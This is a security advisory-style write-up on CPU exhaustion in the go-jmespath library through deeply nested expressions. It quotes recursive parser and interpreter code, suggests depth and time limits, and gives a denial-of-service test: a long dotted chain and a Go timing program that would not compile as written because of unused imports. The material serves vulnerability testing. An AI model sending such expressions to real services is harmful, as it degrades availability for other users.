## Vulnerability List

### 1. Uncontrolled Resource Consumption via Deeply Nested Expressions

* Description:
An attacker can craft a deeply nested JMESPath expression that, when parsed and interpreted, consumes excessive CPU resources, potentially leading to performance degradation. The vulnerability arises from the recursive nature of the parser and interpreter, which can be exploited by deeply nested structures.

* Impact:
High CPU consumption on the server processing the JMESPath expression. In shared hosting environments or applications with usage quotas, this could lead to performance degradation for other users or exceeding resource limits, impacting application availability and resource utilization.

* Vulnerability Rank: High

* Currently Implemented Mitigations:
None. The code does not appear to have any specific mitigations against deeply nested expressions.

* Missing Mitigations:
Implement limits on expression depth or parsing/interpretation time. This could involve:
    - Setting a maximum depth for the AST.
    - Implementing timeouts during parsing and interpretation.
    - Employing techniques to detect and reject overly complex expressions early in the parsing stage.

* Preconditions:
The application must allow users to provide JMESPath expressions that are then parsed and interpreted by the `go-jmespath` library. This is common in scenarios where users can filter or query JSON data using JMESPath.

* Source Code Analysis:
The vulnerability stems from the recursive nature of the parsing and interpretation process.

**Parser:**
In `parser.go`, the `parseExpression` function is recursive:

```go
func (p *Parser) parseExpression(bindingPower int) (ASTNode, error) {
    // ...
    leftNode, err := p.nud(leftToken)
    if err != nil {
        return ASTNode{}, err
    }
    currentToken := p.current()
    for bindingPower < bindingPowers[currentToken] {
        p.advance()
        leftNode, err = p.led(currentToken, leftNode) // Recursive call via led
        if err != nil {
            return ASTNode{}, err
        }
        currentToken = p.current()
    }
    return leftNode, nil
}
```

The `led` (left-denotation) functions in `parser.go` also contribute to recursion, for example in `led` function for `tDot`:

```go
func (p *Parser) led(tokenType tokType, node ASTNode) (ASTNode, error) {
	switch tokenType {
	case tDot:
		if p.current() != tStar {
			right, err := p.parseDotRHS(bindingPowers[tDot]) // Recursive call for RHS
			return ASTNode{
				nodeType: ASTSubexpression,
				children: []ASTNode{node, right},
			}, err
		}
        // ...
    }
    // ...
}
```
`parseDotRHS` and `parseProjectionRHS` also involve recursive calls, allowing for arbitrarily deep AST structures based on nested expressions.

**Interpreter:**
In `interpreter.go`, the `Execute` function is also recursive:

```go
func (intr *treeInterpreter) Execute(node ASTNode, value interface{}) (interface{}, error) {
	switch node.nodeType {
    // ...
    case ASTSubexpression, ASTIndexExpression:
		left, err := intr.Execute(node.children[0], value) // Recursive call
		if err != nil {
			return nil, err
		}
		return intr.Execute(node.children[1], left) // Recursive call
    // ...
    case ASTFilterProjection:
        // ...
        for _, element := range sliceType {
			result, err := intr.Execute(compareNode, element) // Recursive call
            // ...
            current, err := intr.Execute(node.children[1], element) // Recursive call
            // ...
        }
    // ...
    case ASTProjection:
        // ...
        for _, element := range sliceType {
			current, err = intr.Execute(node.children[1], element) // Recursive call
            // ...
        }
    // ...
    }
    // ...
}
```

The `Execute` function recursively traverses the AST, and deeply nested ASTs will result in deep recursion, consuming stack space and CPU time.

* Security Test Case:
1. Send a JMESPath query with a deeply nested structure to the application. For example, a long chain of subexpressions: `"a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a"`.
2. Monitor the CPU usage of the server processing the request through system monitoring tools or application-level metrics if available.
3. Observe if the CPU usage spikes significantly or remains high for an extended period when processing this query compared to normal queries.
4. If the CPU usage is abnormally high, it confirms the vulnerability.

Example of a test expression (programmatically generated for depth):

```
expression = "a"
for _ in range(1000):
    expression += ".a"
```

Send this expression to the `Search` function with some simple JSON data like `{"a": {"a": ... }}` (nested structure matching the expression depth, but can be shallower to observe resource usage). Measure the execution time and resource usage. Compare it with a normal query.

Example Go test code to demonstrate resource consumption (can be adapted for a security test case):

```go
package main

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/jmespath/go-jmespath"
)

func main() {
	expression := "a"
	for i := 0; i < 10000; i++ { // Increased depth for more pronounced effect
		expression += ".a"
	}

	// Shallow JSON data - still triggers deep parsing/execution path
	jsonData := []byte(`{"a": 1}`)


	var data interface{}
	json.Unmarshal(jsonData, &data)

	startTime := time.Now()
	_, err := jmespath.Search(expression, data)
	elapsedTime := time.Since(startTime)

	if err != nil {
		fmt.Printf("Error: %v\n", err)
	} else {
		fmt.Println("Successfully executed expression (though result might be nil due to depth).")
	}
	fmt.Printf("Execution Time: %s\n", elapsedTime)
}
```

Run this test and observe the execution time and resource usage. Without mitigation, the execution time should be significantly longer and CPU usage higher compared to a simple expression, even with shallow JSON data, because the complexity is in the expression itself.

This vulnerability allows a malicious user to potentially impact the performance and availability of the application by providing computationally expensive JMESPath expressions.